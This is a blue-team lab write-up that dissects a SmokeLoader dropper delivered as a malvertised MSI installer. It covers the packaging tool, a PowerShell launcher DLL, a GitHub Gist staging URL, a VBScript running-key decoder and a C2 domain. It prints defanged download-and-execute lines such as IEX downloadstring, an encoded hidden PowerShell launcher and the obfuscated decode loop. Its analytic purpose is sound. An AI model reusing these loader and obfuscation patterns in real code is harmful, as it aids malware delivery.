# MSI Lab

<p align="center">
  <img src="image.png" alt="image.png">
</p>

# Table of Contents
- [Context](#context)
- [Scenario](#scenario)
- [Questions](#questions)
- [Attack Chain](#attack-chain)
  * [Text Tree](#text-tree)
- [Artifacts](#artifacts)
- [Lab Insights](#lab-insights)

# Context

Lab link: [https://cyberdefenders.org/blueteam-ctf-challenges/msi/](https://cyberdefenders.org/blueteam-ctf-challenges/msi/)

Suggested tools: Advanced Installer, ProcMon, Strings, VirusTotal, URLHaus, CyberChef, VS Code

Tactics: Execution, Defense Evasion

# Scenario

An attacker used Google Ads to place their phishing website at the top of search results. This website offered a malicious program installer to visitors. Unfortunately, one of your organization's employees downloaded the installer, triggering a security alert due to the unauthorized download. Your task is to investigate and analyze the installer for any potential security threats it may pose.

# Questions

**Q1**- To analyze the recent cybersecurity breach, it is crucial to identify the tools used by the attacker. What is the name of the packaging tool that created the malicious installer?

Answer: `Advanced Installer`

Reason: Running `strings.exe` against the Microsoft Installer (MSI) package and filtering for `packaging` surfaces the `AI_PACKAGING_TOOL` property in the file's internal database, recording `Advanced Installer 21.2.1 build 90ea225a` as the build tool used. Advanced Installer writes this property by default, and attackers weaponizing an installer frequently forget to strip it, leaving a reliable artifact for identifying the packaging tool that produced the file.

```powershell
PS C:\Users\Administrator\Desktop\Start here\Tools\Strings> .\strings.exe ..\..\Artifacts\malicious.msi | Select-String "packaging"

<SNIP>
tableProductVersion3.21ProductLanguage1033AiPreferFastOem&RepairAI_BUILD_NAMEDefaultBuildAI_CURRENT_YEAR2024{EA9EC272-22B1-45F2-901B-2713DE6F459B}AI_PACKAGING_TOOLAdvanced Installer 21.2.1 build
90ea225aCtrlEvtrepairsrepairsRepairIconButtonText_Yes&YesARPCOMMENTSNvidi.ie (Evaluation Installer)ButtonText_Finish&FinishManufacturerNvidi CompanyWindowsType9XDisplayWindows
9x/MEProductNameNvidiButtonText_Next&Next >WizardSetup WizardARPURLINFOABOUTNvidi.ieARPURLUPDATEINFOButtonText_CancelARPHELPLINKARPHELPTELEPHONEAR
<SNIP>
```

**Q2**- Identifying the DLL files utilized by the malicious installer is critical to understanding its execution mechanism. Can you name the specific **DLL** that the installer imported for its operations?

Answer: `powershellscriptlauncher.dll`

Reason: Running the Microsoft Installer (MSI) file through Advanced Installer's Custom Behavior → Custom Actions view, which lists Custom Actions and their attached binaries, reveals a Custom Action bound to `powershellscriptlauncher.dll`. The tool's internal unpacking process extracts this DLL to a temporary path under `MSIAE80.tmp\Nvidi 3.21\Binary\`. This DLL serves as the bridge from the MSI's install sequence into PowerShell execution, a common technique for smuggling script-based payloads inside a package format that does not natively support arbitrary script execution.

![image.png](image%201.png)

**Q3**- To further dissect the attacker's methods, it's essential to know the URLs with which the malicious installer interacted. What specific URL played a crucial role in the attack, possibly for downloading additional payloads or scripts?

Answer: `hxxps://gist.githubusercontent.com/s00ra/5f0435b61c2ecf621169314f028f8ed5/raw/5b78be0affd9d01413b04e7fec306a35a7e83ec4/gistfile1.txt`

Reason: Running the extracted `powershellscriptlauncher.dll`'s start Custom Action through analysis reveals its `RunPowerShellScript` function contains an `Invoke-WebRequest` call to `hxxps://gist[.]githubusercontent[.]com/s00ra/5f0435b61c2ecf621169314f028f8ed5/raw/5b78be0affd9d01413b04e7fec306a35a7e83ec4/gistfile1.txt`. This pulls attacker-hosted content down and pipes it through `.ParsedHtml.body.innerText`, extracting the raw script content into `rick.vbs`, which is then executed via `cscript`. Staging payloads on a legitimate developer platform such as GitHub Gist is a common defense-evasion technique, since Gist Uniform Resource Locators (URLs) rarely trigger network-based reputation blocks. The `.ParsedHtml.body.innerText` step strips any HTML wrapping from the response, allowing the raw script content to survive the round trip through the text-hosting service.

![image.png](image%202.png)

**Q4**- Understanding the malware's communication network is essential. What is the Command and Control (C2) server address the malware communicated with?

Answer: `hxxp://americanocoffea.ru`

Reason: Reaching the Command and Control (C2) address required fully defusing a multi-layer VBScript dropper rather than a single static lookup. The start Custom Action's `Invoke-WebRequest` call retrieved a public GitHub Gist (safely fetched via `curl` on a separate internet-connected machine, then transferred into the isolated Controlled Content Detonation (CCD) VM) to pull down `rick.vbs`. The script used string-concatenation obfuscation and an `execute()` call to run a payload built from a running-key subtraction cipher, computing `Chr(array[i] - Asc(key[i]))` across a fixed key string and an encoded numeric array. Replacing the `execute()` call with `WScript.Echo` and re-running the script under `cscript` safely surfaced the underlying code without detonating it, revealing a `ShellExecute` call that launched `powershell -nop -w hidden -ep bypass -enc <Base64>`. Decoding the Base64 payload (Base64 to UTF-16LE) via CyberChef revealed an `IEX (New-Object Net.Webclient).downloadstring()` call reaching out to the C2 domain.

```
Chain: Custom Action "start" -> Invoke-WebRequest (gist) -> rick.vbs
       -> execute() defused to WScript.Echo -> ShellExecute reveals:
       cmd.exe /c powershell -nop -w hidden -ep bypass -enc <Base64>
       -> CyberChef (From Base64 -> Decode text UTF-16LE):
       IEX (New-Object Net.Webclient).downloadstring("hxxp://americanocoffea[.]ru")

C2: hxxp://americanocoffea[.]ru
```

```visual-basic
' ===== Execution primitive: runs the decoded string as real code =====
' yPpuUKXHEmSDWkSNcMKmECLjVh = the final decoded payload string (passed in as an argument) Originally: eval("execute(yPpuUKXHEmSDWkSNcMKmECLjVh)") <- runs it as VBScript
' We changed this to WScript.Echo so it prints instead of executing.
Sub vvKfrwrFOsLdtXrsBjHbpTP(yPpuUKXHEmSDWkSNcMKmECLjVh) : WScript.Echo yPpuUKXHEmSDWkSNcMKmECLjVh : End Sub

' ===== The decryption KEY =====
' This is a fixed string used as a repeating XOR/subtraction key. ' Each character of this string will be paired up with one number ' from the array (PQuFbQrIsfNeCrdXWSUiQxvMcgDyVQ), one-to-one by position.
DPCpSVCeIsxKMdYptwFBMAOthOHtjRt = "wFTfEGNpdAbkK<<<SNIP>>>wDHc"

' ===== Decode loop =====
' Loops from 1 to the array's length (LBound+1 to UBound+1, since the ' array is 0-based but this loop counts 1-based to match string indexing ' used by Mid(), which is 1-based).
for EJhxvgvzqitSVJCgvmJL = lbound(PQuFbQrIsfNeCrdXWSUiQxvMcgDyVQ) + 1 to ubound(PQuFbQrIsfNeCrdXWSUiQxvMcgDyVQ) + 1

    ' Grab the Nth character of the key string (1 character at position EJhxvgvzqitSVJCgvmJL)
    EgQNYXtBJbyvzbsnkhXp = mid(DPCpSVCeIsxKMdYptwFBMAOthOHtjRt, EJhxvgvzqitSVJCgvmJL, 1)

    ' Convert that key character to its ASCII/byte value
    kUbyQBjCPDlWMhcWOBjANB = asc(EgQNYXtBJbyvzbsnkhXp)

    ' Grab the corresponding number from the encoded array (index shifted back by 1 since the array is 0-based, loop is 1-based)
    oNBcYTsOCHbBXF = PQuFbQrIsfNeCrdXWSUiQxvMcgDyVQ(EJhxvgvzqitSVJCgvmJL - 1)

    ' THE ACTUAL DECODE OPERATION:
    ' subtract the key's ASCII value from the array's number, then convert the result back into a character. decoded_char = Chr(encoded_number - Asc(key_char))
    hwsKEANFWaOlQTOKyzxOgBdDEEgngZKtIE = chr(oNBcYTsOCHbBXF - kUbyQBjCPDlWMhcWOBjANB)

    ' Append this decoded character onto the growing result string
    CzVSrYTOisCktDpoRvcYijGYVaUu = CzVSrYTOisCktDpoRvcYijGYVaUu & hwsKEANFWaOlQTOKyzxOgBdDEEgngZKtIE

next

' ===== Fake/junk conditional (always evaluates to true) =====
Set tXGgxJSfaKwiAknYMxgbIkFtzrLQGjNlojxMo = CreateObject("Scripti"&"ng.FileS"&"ystemObject")
If tXGgxJSfaKwiAknYMxgbIkFtzrLQGjNlojxMo.FolderExists("c"&":use"&"rsoC")=false Then
    ' Hand off the fully decoded string to the "execute" sub (now just Echo)
    vvKfrwrFOsLdtXrsBjHbpTP(CzVSrYTOisCktDpoRvcYijGYVaUu)
End If
```

**Q5**- Identifying the geographical origin of the attack can provide context and help in preventive measures. Which country has been identified as the source of this cybersecurity breach?

Answer: Russia

Reason: With the C2 domain `americanocoffea[.]ru` already identified, the `.ru` top-level domain itself is the direct indicator here, a country-code TLD registered specifically for the Russian Federation, pointing to Russia as the geographical origin attributed to this attack infrastructure.

**Q6**- Identifying the malware family associated with the attack is crucial for understanding its behavior and potential mitigation strategies. What is the name of the malware family linked to this incident?

Answer: Smoke Loader

Reason: Pivoting from the identified C2 domain into VirusTotal's search, querying the domain and associated hash, surfaces vendor family-label tags that, despite one competing label (Qakbot) and generally noisy detection naming, converge on SmokeLoader as the associated malware family. This is consistent with the observed attack chain: a lightweight, obfuscated loader (the MSI to VBScript to PowerShell chain) whose sole function is fetching and executing a further-stage payload from a remote C2, matching SmokeLoader's typical role as a first-stage downloader/loader rather than a full-featured payload in its own right.

# Attack Chain

| Step | Stage | Detail | MITRE |
| --- | --- | --- | --- |
| 1 | Initial Access | Employee downloaded `malicious.msi` from a phishing site ranked via Google Ads malvertising | T1189, T1566.002 |
| 2 | Execution | `msiexec.exe` processes `malicious.msi`, built with Advanced Installer 21.2.1 build 90ea225a | T1218 |
| 3 | Execution | Custom Action start invokes `powershellscriptlauncher.dll` (Function: RunPowerShellScript) | T1059.001 |
| 4 | Defense Evasion | Legitimate developer platform abused: Invoke-WebRequest pulls staged script from `hxxps://gist.githubusercontent[.]com/s00ra/5f0435b61c2ecf621169314f028f8ed5/raw/.../gistfile1.txt` | T1102, T1105 |
| 5 | Execution | Retrieved content written to `rick.vbs` via Out-File, executed with `cscript` | T1059.005 |
| 6 | Defense Evasion | `rick.vbs` uses string-concatenation obfuscation to rebuild Scripting.FileSystemObject / Shell.Application COM calls and a decoy always-true FolderExists conditional | T1027 |
| 7 | Defense Evasion | Running-key subtraction cipher (`Chr(array[i] - Asc(key[i]))`) decodes the true payload string at runtime, gated behind `eval("execute(...)")` | T1027, T1140 |
| 8 | Execution | Shell.Application.ShellExecute launches `cmd.exe /c powershell -nop -w hidden -ep bypass -enc <Base64>` | T1059.001, T1218.007 |
| 9 | Defense Evasion | Base64/UTF-16LE-encoded PowerShell command hides the true instruction from plaintext inspection | T1140, T1027 |
| 10 | Command and Control | Decoded command `IEX (New-Object Net.Webclient).downloadstring(...)` reaches out to C2 `hxxp://americanocoffea[.]ru` | T1071.001, T1105 |

## Text Tree

```visual-basic
[Google Ads Malvertising]  ← attacker → victim
    └── malicious installer download (top search result)
        └── malicious.msi executed (built with Advanced Installer 21.2.1)
            └── msiexec.exe
                └── [Stage 1 — Execution]
                    └── Custom Action "start" triggers powershellscriptlauncher.dll
                        └── Function: RunPowerShellScript
                            └── Invoke-WebRequest → hxxps://gist.githubusercontent[.]com/s00ra/.../gistfile1.txt
                                └── .ParsedHtml.body.innerText | Out-File "rick.vbs"
                                    └── cscript rick.vbs
                                        ├── [Stage 2 — Defense Evasion / Obfuscation]
                                        │   └── string-concatenation obfuscation (Scripting.FileSystemObject, Shell.Application)
                                        │       └── running-key subtraction cipher decode loop
                                        │           └── Chr(array[i] - Asc(key[i])) ← builds hidden payload string
                                        │               └── execute() runs decoded payload
                                        └── [Stage 3 — Execution / C2]
                                            └── sh.ShellExecute → cmd.exe /c powershell -nop -w hidden -ep bypass -enc <Base64>
                                                └── Base64 (UTF-16LE) decode via CyberChef
                                                    └── IEX (New-Object Net.Webclient).downloadstring("hxxp://americanocoffea[.]ru")  ← C2 callout
                                                        └── Attribution: SmokeLoader malware family, origin Russia (.ru TLD)
```

# Artifacts

**Host Indicators**

| Type | Value |
| --- | --- |
| Malicious installer | `malicious.msi` |
| Packaging tool identified | Advanced Installer 21.2.1 build 90ea225a |
| Imported DLL | `powershellscriptlauncher.dll` |
| DLL extraction path | `C:\Users\ADMINI~1\AppData\Local\Temp\2\MSIAE80.tmp\Nvidi 3.21\Binary\powershellscriptlauncher.dll` |
| Dropped script | `rick.vbs` |

**Network Indicators**

| Type | Value |
| --- | --- |
| Staging URL (script delivery) | `hxxps://gist[.]githubusercontent[.]com/s00ra/5f0435b61c2ecf621169314f028f8ed5/raw/5b78be0affd9d01413b04e7fec306a35a7e83ec4/gistfile1[.]txt` |
| C2 server | `hxxp://americanocoffea[.]ru` |

**Execution Indicators**

| Type | Value |
| --- | --- |
| Custom Action | start (Function: `RunPowerShellScript`) |
| Shell command chain | `cmd.exe /c powershell -nop -w hidden -ep bypass -enc <Base64>` |
| Decoded final command | `IEX (New-Object Net.Webclient).downloadstring("hxxp://americanocoffea[.]ru")` |

**Attribution**

| Type | Value |
| --- | --- |
| Malware family | Smoke Loader |
| Attributed origin | Russia (`.ru` ccTLD) |

# Lab Insights

- Static analysis is a chain of "unwrap one layer at a time," not a single decode. This lab stacked five distinct obfuscation layers — MSI Custom Actions, a gist-hosted staging script, string-concatenation obfuscation, a running-key cipher, and Base64/UTF-16LE PowerShell encoding — each trivial in isolation but collectively enough to defeat naïve signature scanning end-to-end. The lesson isn't any single decode technique, it's building the discipline to keep peeling without assuming you've reached the bottom.
- Neutralizing the execution primitive beats trying to sandbox the whole chain. Rather than running the MSI, bypassing RAM checks, or fighting an unavailable script debugger, the fastest path to ground truth was finding the single execute()/eval() call point and swapping it for `WScript.Echo` — turning a "run it and see what happens" problem into a "read what it would have run" problem. Identifying where dynamic code execution actually happens in a script is more valuable than any tooling around it.
- Obfuscation quality varies wildly within the same sample, and that variance is itself a signal. The `FolderExists("c:usersoC")` decoy condition was a broken, always-true check — sloppy obfuscation meant purely to look legitimate to a skimming analyst — while the running-key cipher and Base64/UTF-16LE PowerShell encoding were functionally sound. Learning to distinguish "real logic gate" from "junk filler meant to slow you down" saves significant analysis time.
- Legitimate infrastructure as a delivery vector defeats reputation-based blocking. Staging the second-stage script on a public GitHub Gist — rather than attacker-owned infrastructure — meant the delivery URL itself carried no inherent bad reputation; only the C2 domain (`americanocoffea[.]ru`) was attacker-controlled. This split (trusted platform for delivery, disposable domain for C2) is a recurring pattern worth watching for across loader families, not just SmokeLoader.